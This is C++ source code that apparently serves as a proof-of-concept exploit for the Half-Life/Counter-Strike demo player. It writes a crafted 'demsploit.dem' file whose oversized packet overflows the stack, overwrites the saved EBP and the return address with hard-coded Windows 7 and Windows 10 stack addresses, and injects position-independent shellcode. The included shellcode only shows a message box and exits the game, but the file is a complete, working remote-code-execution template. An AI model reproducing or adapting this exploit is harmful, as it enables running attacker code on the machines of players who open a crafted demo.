#include <Windows.h>
#include <iostream>
#include <time.h>

#include "Common/Types.h"
#include "Utils/File.h"
#include "Utils/InlineCode.h"

void shellcode()
{
	//
	// Go to the bottom of the stack to get ability to
	// allocate arguments in shellcode function.
	//

	__asm
	{
		sub esp, 0x8000;
	}

	//
	// Allocating string on the stack. We can't use global
	// memory, because we are going to use this code as shellcode,
	// what means that all global pointers will be invalid.
	//
	// Stack is the local function memory, so we can write our strings
	// here freely.
	//

	const wchar_t szUser32[]      = { 'U', 'S', 'E', 'R', '3', '2', '.', 'd', 'l', 'l', '\0' };
	const wchar_t szMessageBoxW[] = { 'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'W', '\0' };

	const wchar_t szKernel32[]    = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', '\0' };
	const wchar_t szExitProcess[] = { 'E', 'x', 'i', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', '\0' };
	
	auto pfnMessageBoxW = (TMessageBoxW)GetProcAddressPeb(szUser32, szMessageBoxW);
	auto pfnExitProcess = (TExitProcess)GetProcAddressPeb(szKernel32, szExitProcess);

	const wchar_t szMessage[] =
	{
		'S', 'h', 'e', 'l', 'l', 'c', 'o', 'd', 'e', ' ',
		'b', 'y', ' ',
		'A', 'l', 'e', 'x', 'a', 'n', 'd', 'e', 'r', ' ', 'B', '.', ' ',
		':', ')', '\0',
	};

	//
	// Show message box with our message and exit from the game.
	//

	pfnMessageBoxW(HWND_DESKTOP, szMessage, NULL, MB_SYSTEMMODAL);
	pfnExitProcess(EXIT_SUCCESS);

} int shellcodeEnd() { return 0x01010102; }

void WriteMalformedData(FILE *stream)
{
	demomsgheader_t exploitMsg = { 0 };
	{
		exploitMsg.id = 9;
		exploitMsg.time = 0.0f;
		exploitMsg.frame = 0;
	}

	fwrite(&exploitMsg, stream);

	//
	// 32768 - max packet size
	// 4     - message length
	// 4     - EBP reserved value
	// 4     - return address
	//

	unsigned char data[32768 + 4 + 4 + 4 + 10000]; // 10000 - approximate code size
	{
#if 0
		//
		// Fill exploitable packet with random data.
		//

		srand((unsigned int)time(NULL));
		
		auto p = (unsigned char *)&data;
		auto pe = &p[sizeof(data) - 1];

		while (p < pe)
		{
			*p++ = rand() & 0xFF;
		}
#endif

		memset(data, 0, sizeof(data));
	}

	/*
		return address position

		Windows 7 (7601)  - 0x17F838
		Windows 10 (1803) - 0x18F864
	*/

	//
	// It's really hard to make C++ compiler (at least VS compiler)
	// to calculate the shellcode size, so we just going to use
	// approximate size. I believe that's enough space.
	//

	unsigned long nCodeSize = 8000;

	*(int *)&data[32768 + 4] = 0xDEADC0DE;   // EBP
	*(int *)&data[32768 + 4 + 4] = 0x18F864; // Shellcode start address

	auto sc = &data[32768 + 4 + 4 + 4];
	memcpy(sc, shellcode, nCodeSize);

	fwrite<int>(sizeof(data), stream);
	fwrite(&data, stream);
}

void WriteLastMessage(FILE *stream)
{
	demomsgheader_t lastMsg = { 0 };
	{
		lastMsg.id = 5;
		lastMsg.time = 0.0f;
		lastMsg.frame = 0;
	}

	fwrite(&lastMsg, stream);
}

int main()
{
	FILE *f;
	fopen_s(&f, "demsploit.dem", "wb");
	
	if (!f)
	{
		return 0;
	}

	demoheader_t header = { 0 };
	{
		//
		// Build demo-file header.
		//

		strcpy_s(header.szFileStamp, "HLDEMO");

		header.nDemoProtocol = 5;
		header.nNetProtocolVersion = 48;

		strcpy_s(header.szMapName, "de_dust2");
		strcpy_s(header.szDllDir, "cstrike");

		header.mapCRC = 0xC0FFEE00;

		//
		// Segments potision in file. Will be filled later.
		//

		header.nDirectoryOffset = 0;
	}

	demoentry_t entry = { 0 };
	{
		//
		// Build exploitable demo segment.
		//

		entry.nEntryType = 0;

		strcpy_s(entry.szDescription, "PUTTING A SHELLCODE IN YOUR STACK :)");

		entry.nFlags = 0;
		entry.nCDTrack = -1;
		entry.fTrackTime = 0.0f;

		//
		// Segment will be consist only one exploitable frame.
		//

		entry.nFrames = 1;

		//
		// Offset of first segment is always equal to 544, that
		// is equal to demo header size.
		//

		entry.nOffset = sizeof(header);

		//
		// Demo size. Can be ignored.
		//

		entry.nFileLength = 0;
	}

	fwrite(&header, f);

	//
	// After demo header comes demo data. We are going to write
	// our exploit here.
	//

	WriteMalformedData(f);

	//
	// Last message, because every demo must be finished with it.
	// You can remove this code, thought, I wrote it for debug
	// purposes.
	//

	WriteLastMessage(f);

	//
	// After demo data comes demo segments (directories). We need to collect
	// current file position and write it to 'header.nDirectoryOffset' later.
	//

	int dirOffset = ftell(f);

	//
	// Write segment count.
	//
	// Normal demo contains minimum 2 segments - 'startup' and 'normal'.
	// Startup needs for preparing client to play demo, and 'normal' is
	// regular data, captured during play. Exploit needs only one segment,
	// so we are going to ignore 'normal' segments.
	//

	fwrite<int>(1, f);

	//
	// Write our segment.
	//

	fwrite(&entry, f);

	//
	// Go to the 'header.nDirectoryOffset' position and
	// write 'dirOffset' to it.
	//

	fseek(f, sizeof(header) - 4, 0);
	fwrite<int>(dirOffset, f);

	//
	// Close demo file.
	//

	fclose(f);

	//
	// Exploitable demo is successfully created.
	//

	return 0;
}
